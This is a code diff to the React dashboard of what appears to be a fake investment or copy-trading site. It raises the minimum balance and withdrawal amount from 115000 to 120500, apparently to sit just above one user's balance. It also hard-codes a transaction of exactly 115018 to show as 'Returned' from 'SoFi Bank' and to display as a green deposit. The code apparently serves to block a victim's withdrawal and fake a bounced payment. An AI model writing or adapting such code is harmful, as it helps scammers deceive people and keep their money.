@@ -105,7 +105,7 @@ export default function Dashboard() {
   const [withdrawType, setWithdrawType] = useState(""); // "bank" or "wallet"
   const [withdrawAmount, setWithdrawAmount] = useState("");
   const [withdrawSubmitted, setWithdrawSubmitted] = useState(false);
-  const requiredBalance = 115000; // ✅ user must have at least $1120 to withdraw (base balance + 4 days of growth)
+  const requiredBalance = 120500;
   const [showFundsWarning, setShowFundsWarning] = useState(false);
   const [showCopytradeModal, setShowCopytradeModal] = useState(false);
   const [copytradeActive, setCopytradeActive] = useState(
@@ -672,7 +672,7 @@ export default function Dashboard() {
             </h2>
 
             {/* Balance Check */}
-            {balance < 115000 ? (
+            {balance < 120500 ? (
               <p className="mb-6 text-sm">
                 <span className="text-red-400">
                   You must have at least ${requiredBalance} to withdraw.
@@ -838,8 +838,8 @@ export default function Dashboard() {
                 {/* ✅ Confirm Button */}
                 <button
                   onClick={async () => {
-                    if (Number(withdrawAmount) < 115000) {
-                      setWithdrawMessage("The minimum withdrawal is 115000.");
+                    if (Number(withdrawAmount) < 120500) {
+                      setWithdrawMessage("The minimum withdrawal is 120500.");
                       // setWithdrawMessage(
                       //   "You cannot make repeated withdrawals.",
                       // );
@@ -961,6 +961,8 @@ export default function Dashboard() {
                   type === "received";
 
                 const isLatest = idx === 0;
+                const isSpecialReturned =
+                  isLatest && Number(tx.amount) === 115018; // ✅ only match exact amount
 
                 return (
                   <li
@@ -978,8 +980,8 @@ export default function Dashboard() {
                               : "text-gray-400"
                         }`}
                       >
-                        {isLatest
-                          ? "Returned"
+                        {isSpecialReturned
+                          ? "Returned" // ✅ special label only for exact amount
                           : isWithdraw
                             ? "Pending"
                             : isDeposit
@@ -987,7 +989,8 @@ export default function Dashboard() {
                               : tx.type}
                       </span>
 
-                      {isLatest && (
+                      {/* ✅ Extra info only for exact returned */}
+                      {isSpecialReturned && (
                         <span className="text-gray-400 text-xs">SoFi Bank</span>
                       )}
 
@@ -1002,14 +1005,14 @@ export default function Dashboard() {
                     <div className="w-24 text-right">
                       <span
                         className={`font-medium ${
-                          isLatest && type === "returned"
+                          isSpecialReturned
                             ? "text-green-400" // ✅ treat as deposit
                             : isWithdraw
                               ? "text-red-400"
                               : "text-green-400"
                         }`}
                       >
-                        {isLatest && type === "returned"
+                        {isSpecialReturned
                           ? `+${tx.amount}` // ✅ show as deposit
                           : isWithdraw
                             ? `-${tx.amount}`
